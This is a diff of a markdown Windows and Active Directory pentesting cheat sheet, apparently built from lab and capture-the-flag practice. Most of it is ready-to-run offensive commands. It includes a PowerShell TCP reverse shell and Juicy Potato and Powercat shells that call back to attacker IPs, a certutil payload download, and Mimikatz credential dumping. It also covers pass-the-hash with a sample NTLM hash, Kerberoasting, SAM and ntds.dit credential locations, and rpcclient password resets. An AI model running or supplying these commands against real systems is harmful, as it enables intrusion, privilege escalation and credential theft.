@@ -1,4 +1,7 @@
-### Enumeration & Commands
+# Windows
+
+#### Enumeration & Commands
+
 ```
 systeminfo
 schtasks /query /fo LIST /v		# scheduled task
@@ -20,20 +23,25 @@ whoami /groups		# UAC bypass
 robocopy /b C:\Users\Administrator\Desktop\ C:\		# with SeBackupPrivilege from whoami /priv
 ```
 
-### BloodHound & Query
+#### BloodHound & Query
+
 ```
 bloodhound-python -u [username] -p [password[ -d blackfield.local -ns 10.10.10.192 -c DcOnly
 MATCH p=(u {owned: true})-[r1]->(n) WHERE r1.isacl=true RETURN p
 ```
 
-### Juicy Potato
+#### Juicy Potato
+
 ```
 potato86.exe -l 1337 -c "{659cdea7-489e-11d9-a9cd-000d56965251}" -p c:\windows\system32\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.119.160 4321" -t *
 ```
 
-### SAM (Security Account Manager)
-A file that store Windows user credential. It can only be accessed when the Windows OS is not booted up. (Eg. from another OS) <br />
-Passwords are LM & NTLM hashed <br />
+#### SAM (Security Account Manager)
+
+A file that store Windows user credential. It can only be accessed when the Windows OS is not booted up. (Eg. from another OS)\
+Passwords are LM & NTLM hashed\
+
+
 ```
 Default file location: 
 C:\Windows\System32\config\SAM
@@ -52,8 +60,10 @@ Format of Hashes:
 
 Ref: https://techgenix.com/how-cracked-windows-password-part2/
 
-### Active Directory & LDAP
+#### Active Directory & LDAP
+
 Enum
+
 ```
 nmap -n -sV --script "ldap* and not brute" [IP_ADDR]
 ldapsearch -H ldap://[IP_ADDR] -x -b "dc=[DC],dc=[DC]"
@@ -67,9 +77,11 @@ psexec.py htb.local/administrator@10.10.10.161 -hashes [ntlm:hash]	# login with 
 MS14-068 (For DC older than Windows Server 2012 R2)		# Ref: https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html
 Database of AD stored on C:\Windows\NTNDS\ntds.dit of DC
 ```
+
 Ref: https://book.hacktricks.xyz/pentesting/pentesting-ldap
 
-### PowerShell
+#### PowerShell
+
 ```
 Import-Module [filename].ps1
 C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt   # check powershell history
@@ -95,14 +107,16 @@ Rubeus.exe kerberoast /tgtdeleg /user:[samaccountname]
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
-### Metasploit
+#### Metasploit
+
 ```
 getsystem
 load kiwi   # mimikatz
 lsa_dump_sam
 ```
 
-### RPC
+#### RPC
+
 ```
 rpcdump.py [USERNAME]@[IP_ADDR]
 rpcclient -U '' [IP_ADDR]
@@ -110,19 +124,21 @@ rpcclient -U '' [IP_ADDR]
   > setuserinfo [username] [level] [password]		# level: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN
 ```
 
+#### Evil-WinRM
 
-### Evil-WinRM
 ```
 evil-winrm -i [IP_ADDR] -u [USERNAME] -H [HASH]   # hash retrievable from secretsdump.py machines/smb
 evil-winrm -i [IP_ADDR] -u [USERNAME] -p [PASSWORD]
 ```
 
-### Tcpdump
+#### Tcpdump
+
 ```
 tcpdump -i tun0 icmp -v   # listen for icmp ping to tun0 interface
 ```
 
-### Mimikatz
+#### Mimikatz
+
 ```
 privilege::debug
 token::elevate
@@ -134,14 +150,16 @@ kerberos::list
 sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe    # using ntlm of other user (retrieved from logonpasswords) to execute a program
 ```
 
-### Powercat
+#### Powercat
+
 ```
 . .\powercat.ps1
 powercat -c 10.11.0.4 -p 443 -e cmd.exe   # reverse shell
 powercat -l -p 443 -e cmd.exe   # bind shell
 ```
 
-### wget equivalant / file transfer
+#### wget equivalant / file transfer
+
 ```
 certutil.exe -f -urlcache -split http://192.168.49.157/winPEASany.exe
 
@@ -168,7 +186,8 @@ on Windows:
 powercat -c 10.11.0.4 -p 443 -i C:\Users\admin\powercat.ps1
 ```
 
-### Kerberoasting with Rubeus
+#### Kerberoasting with Rubeus
+
 ```powershell
 $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 
@@ -201,6 +220,7 @@ Foreach($obj in $Result)
 	Write-Host "------------------------"
 }
 ```
+
 1. Find interesting SPN (Service Principal Name)
 2. Get its SAMaccountname
-3. rubeus.exe 
+3. rubeus.exe
